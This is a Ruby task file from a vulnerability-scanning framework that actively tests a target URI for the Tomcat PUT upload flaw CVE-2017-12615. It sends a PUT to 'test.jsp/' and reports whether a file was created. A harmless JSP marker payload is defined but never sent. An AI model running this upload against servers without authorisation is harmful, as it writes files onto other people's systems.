module Intrigue
module Task
class TomcatPutJsp < BaseTask

  def self.metadata
    {
      :name => "tomcat_put_jsp",
      :pretty_name => "Vulnerability Check - Tomcat PUT method",
      :identifiers => [{ "cve" =>  "CVE-2017-12615" }],
      :authors => ["jcran"],
      :description => "Trigger Tomcat PUT - CVE-2017-12615",
      :references => [
        "https://github.com/breaktoprotect/CVE-2017-12615"
      ],
      :type => "vulnerability_check",
      :passive => false,
      :allowed_types => ["Uri"],
      :example_entities => [ {"type" => "Uri", "details" => {"name" => "https://intrigue.io"}} ],
      :allowed_options => [  ],
      :created_types => []
    }
  end

  ## Default method, subclasses must override this
  def run
    super

    uri = _get_entity_name

    payload = '<% out.write("<html><body><h3>[+] JSP file successfully uploaded via curl and JSP out.write executed.</h3></body></html>"); %>'

    #docs/manager-howto.jsp

    begin
      response = RestClient::Request.execute(
        :url => "#{uri}/test.jsp/",
        :method => :put,
        :headers => { content_type: 'text/plain'},
        :verify_ssl => false
      )

      unless response
        _log_error "No response received?"
        return
      end

      if response.code == 201
        _log_good "SUCCESS!"
        _log_good "Access the page at:  #{uri}/test.jsp"
      end

    rescue RestClient::MethodNotAllowed => e
      _log_good "405: NOT VULNERABLE"
    rescue RestClient::ResourceNotFound => e
      _log_error "404: #{e}"
    rescue RestClient::Forbidden => e
      _log_error "Forbidden: #{e}"
      return
    end

  end

end
end
end
